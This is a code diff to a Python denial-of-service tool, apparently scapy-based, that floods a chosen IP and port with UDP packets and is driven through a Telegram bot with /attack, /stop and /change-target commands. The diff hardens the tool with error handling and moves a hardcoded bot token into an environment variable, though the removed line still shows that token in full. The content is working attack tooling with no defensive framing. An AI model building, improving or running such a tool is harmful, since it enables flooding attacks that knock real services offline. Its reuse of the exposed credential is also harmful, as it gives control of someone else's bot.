@@ -16,7 +16,10 @@ class DDoSAttack:
     def start_attack(self):
         self.running = True
         while self.running:
-            send(IP(dst=self.ip)/UDP(dport=self.port), count=1000)
+            try:
+                send(IP(dst=self.ip)/UDP(dport=self.port), count=1000)
+            except Exception as e:
+                logging.error(f"Error sending packets: {e}")
 
     def stop_attack(self):
         self.running = False
@@ -26,7 +29,7 @@ class DDoSAttack:
         self.port = new_port
 
 def telegram_bot_start():
-    bot_api_key = "8625781811:AAGymdn1JBdoOj2aba1kpmz9vebH9k3Q0Ko"
+    bot_api_key = os.environ["TELEGRAM_BOT_API_KEY"]
     bot_url = f"https://api.telegram.org/bot{bot_api_key}/"
 
     # Handle commands
@@ -58,11 +61,17 @@ def telegram_bot_start():
                     elif command_text[0] == "/help":
                         send_message(chat_id, "Available commands: /start, /attack, /stop, /change")
                     elif command_text[0] == "/attack":
-                        ddos_attack.start_attack()
-                        send_message(chat_id, "Attack started.")
+                        try:
+                            ddos_attack.start_attack()
+                            send_message(chat_id, "Attack started.")
+                        except Exception as e:
+                            send_message(chat_id, f"Error starting attack: {e}")
                     elif command_text[0] == "/stop":
-                        ddos_attack.stop_attack()
-                        send_message(chat_id, "Attack stopped.")
+                        try:
+                            ddos_attack.stop_attack()
+                            send_message(chat_id, "Attack stopped.")
+                        except Exception as e:
+                            send_message(chat_id, f"Error stopping attack: {e}")
                     elif command_text[0] == "/change":
                         try:
                             new_ip = command_text[1]
@@ -71,6 +80,10 @@ def telegram_bot_start():
                             send_message(chat_id, f"Target changed to {new_ip}:{new_port}")
                         except (IndexError, ValueError):
                             send_message(chat_id, "Invalid command. Use /change <new_ip> <new_port>")
+                        except Exception as e:
+                            send_message(chat_id, f"Error changing target: {e}")
+                    else:
+                        send_message(chat_id, "Unknown command. Type /help for available commands.")
             time.sleep(1)
         except Exception as e:
             logging.error(f"Error: {e}")
